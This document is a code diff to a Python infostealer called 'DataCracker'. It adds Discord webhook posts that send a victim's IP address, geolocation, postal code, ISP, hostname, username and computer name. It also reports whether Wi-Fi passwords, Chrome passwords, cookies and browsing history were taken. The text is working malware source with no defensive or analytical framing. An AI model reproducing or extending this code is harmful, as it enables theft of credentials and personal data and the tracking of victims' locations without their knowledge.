@@ -105,7 +105,7 @@ try:
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
     # Username
-    username = getpass.getuser()
+    usernamepc = getpass.getuser()
     # Computer Name (Windows only)
     if os_name == 'Windows':
         computer_name = os.environ['COMPUTERNAME']
@@ -399,8 +399,10 @@ try:
     # Clean up the temporary copy of the Chrome history database
     os.remove(temp_history_path)
     gotchromehistory = True
+    print(gotchromehistory)
 except:
     gotchromehistory = False
+    print(gotchromehistory)
 
 # --------------------------------------------------------------------------------------------------------------------------------------------------
 # --------------------------------------------------------------------------------------------------------------------------------------------------
@@ -523,6 +525,13 @@ except:
 #        f.write("Cookies\n")
 
 try:
+    def emojitof(Input):
+        if Input is True:
+            return ":white_check_mark:"
+        elif Input == "True":
+            return ":white_check_mark:"
+        else:
+            return ":x:"
     webhook_data = {
         "content": "@everyone",
         "color": 6749952,
@@ -533,37 +542,37 @@ try:
                 "fields": [
                     {
                         "name": "Got Wifi Profiles",
-                        "value": gotprofile1,
+                        "value": emojitof(gotprofile1),
                         "inline": True
                     },
                     {
                         "name": "Got Wifi Profiles Passwords",
-                        "value": gotprofiledata,
+                        "value": emojitof(gotprofiledata),
                         "inline": True
                     },
                     {
                         "name": "Got IP-Address Infos",
-                        "value": gotipinfo,
+                        "value": emojitof(gotipinfo),
                         "inline": True
                     },
                     {
                         "name": "Asked for Cookies",
-                        "value": askedforcookies,
+                        "value": emojitof(askedforcookies),
                         "inline": True
                     },
                     {
                         "name": "Got System Infos",
-                        "value": gotsysteminfo,
+                        "value": emojitof(gotsysteminfo),
                         "inline": True
                     },
                     {
                         "name": "Got Chrome Passwords",
-                        "value": gotpw,
+                        "value": emojitof(gotpw),
                         "inline": True
                     },
                     {
                         "name": "Got Chrome Search History",
-                        "value": gotchromehistory,
+                        "value": emojitof(gotchromehistory),
                         "inline": True
                     }
                 ],
@@ -587,6 +596,111 @@ try:
 
 except Exception as e:
     print("Fehler beim Ausführen des Codes (Webhook):", str(e))
+
+try:
+    webhook_data = {
+        "username": "DataCracker Bot",
+        "avatar_url": "https://example.com/avatar.png",
+        "embeds": [
+            {
+                "title": "DataCracker - By LennyMaxMine",
+                "content": "@everyone",
+                "color": 16711680,
+                "fields": [
+                    {
+                        "name": ":computer: IP Address (Request)",
+                        "value": ipdata['ip'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":computer: IP Address (OS)",
+                        "value": ip_address,
+                        "inline": True
+                    },
+                    {
+                        "name": ":computer: Hostname",
+                        "value": ipdata['hostname'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":cityscape: City",
+                        "value": ipdata['city'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":computer: Region",
+                        "value": ipdata['region'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":flag_white: Country",
+                        "value": ipdata['country'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":earth_americas: Latitude and Longitude",
+                        "value": ipdata['loc'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":earth_americas: Google Earth",
+                        "value": "https://www.google.de/maps/place/" + ipdata['loc'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":earth_americas: Postal Code",
+                        "value": ipdata['postal'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":watch: Timezone",
+                        "value": ipdata['timezone'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":globe_with_meridians: Internet Service Provider",
+                        "value": ipdata['org'],
+                        "inline": True
+                    },
+                    {
+                        "name": ":computer: Operating System",
+                        "value": os_name,
+                        "inline": True
+                    },
+                    {
+                        "name": ":desktop_computer: Version",
+                        "value": os_version,
+                        "inline": True
+                    },
+                    {
+                        "name": ":desktop_computer: Hostname",
+                        "value": hostname,
+                        "inline": True
+                    },
+                    {
+                        "name": ":bust_in_silhouette: Username",
+                        "value": usernamepc,
+                        "inline": True
+                    },
+                    {
+                        "name": ":computer: Computer Name",
+                        "value": computer_name,
+                        "inline": True
+                    }
+                ]
+            }
+        ]
+    }
+
+    # Konvertiere JSON-Daten in einen String
+    webhook_json = json.dumps(webhook_data)
+
+    # Sende den POST-Request an den Webhook
+    response = requests.post(wurl, data=webhook_json, headers={
+                             'Content-Type': 'application/json'})
+
+except Exception as e:
+    print("Fehler beim Ausführen des Codes (Webhook2):", str(e))
 
 
 def send_file_to_discord_webhook(webhook_url, file_path):
@@ -632,7 +746,6 @@ except:
 
 
 try:
-    database = f'./Loginvault.db'
-    os.remove(database)
+    os.remove(f'./Loginvault.db')
 except:
     None
